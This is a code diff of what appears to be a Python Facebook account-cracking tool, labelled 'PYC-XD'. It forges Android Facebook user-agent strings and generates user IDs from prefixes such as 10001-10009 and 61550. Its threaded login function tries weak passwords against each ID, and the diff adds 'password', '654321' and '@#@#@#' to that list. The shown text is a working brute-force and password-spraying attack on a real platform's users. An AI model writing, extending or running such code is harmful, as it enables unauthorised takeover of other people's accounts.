@@ -49,6 +49,7 @@ def Samsung():
     ua = f"Dalvik/2.1.0 (Linux; U; Android {Anderson}; {model} Build/LRX22C) [FBAN/{FBAN};FBAV/{cho}.0.0.15.89;FBPN/{platform};FBLC/sv_SE;FBBV/{vir};FBCR/S COMVIQ;FBMF/samsung;FBBD/samsung;FBDV/{model};FBSV/5.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{{density={random.choice(range(1, 4))}.0,width={random.choice(range(720, 1500))},height={random.choice(range(1500, 2000))};FB_FW/1;]"
     return ua
 
+
 def uaxxxx():
     rr = random.randint
     aZ = random.choice(
@@ -61,9 +62,6 @@ def uaxxxx():
 
 oks = []
 loop = []
-
-
-
 
 
 class sort:
@@ -93,12 +91,12 @@ def old():
     sort.clear()
     sort.logo()
     print("[b]    [red1][A] [sea_green2]Crack 10001-10009 Id")
-    print("[b]    [red1][B] [spring_green1]Crack 6155 Id")
+    print("[b]    [red1][B] [spring_green1]Crack 61550 Id")
     print(sort.line())
     ask = input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m ")
 
     if ask in ["1", "01", "a", "A"]:
-        print(" [b]    [red1]✗ [chartreuse1]Selected  [orange3]▶  [chartreuse1]Uid 2011-14")
+        print(" [b]    [red1]✗ [chartreuse1]Selected  [orange3]▶  [chartreuse1]Uid 10001-10009")
         print(sort.line())
         print("[b]     [red1]✗ [chartreuse1]Example   [orange3]▶  [chartreuse1]100000, 200000")
         limit = int(input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m "))
@@ -109,7 +107,7 @@ def old():
             user.append(data)
     else:
         star = "615509"
-        print(" [b]    [red1]✗ [chartreuse1]Selected  [orange3]▶  [chartreuse1]Uid 2009-10")
+        print(" [b]    [red1]✗ [chartreuse1]Selected  [orange3]▶  [chartreuse1]Uid 61550")
         print(sort.line())
         print("  [b]   [red1]✗ [chartreuse1]Example   [orange3]▶  [chartreuse1]100000, 200000")
         limit = int(input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m "))
@@ -134,7 +132,6 @@ def old():
             heron.submit(login, uid, meth)
 
 
-
 def login(uid, meth):
     global oks, loop
     Session = requests.session()
@@ -142,7 +139,7 @@ def login(uid, meth):
         sys.stdout.write(
             f"\r  \x1b[38;1;196m  \x1b[38;0;196m└\033[38;5;46m[{sort.color()}PYC-XD\033[38;5;46m]~[\x1b[1;97m{loop}-M{meth}\033[38;5;46m]-[\x1b[1;90mOK:{str(len(oks))}\033[38;5;46m] \r\r")
         sys.stdout.flush()
-        for pw in ["123456", "1234567", "12345678", "123456789"]:
+        for pw in ["123456", "1234567", "12345678", "123456789", "password", "654321", "@#@#@#"]:
             if meth in ["1", "01", "A", "a"]:
                 agent = uaxxxx()
             else:
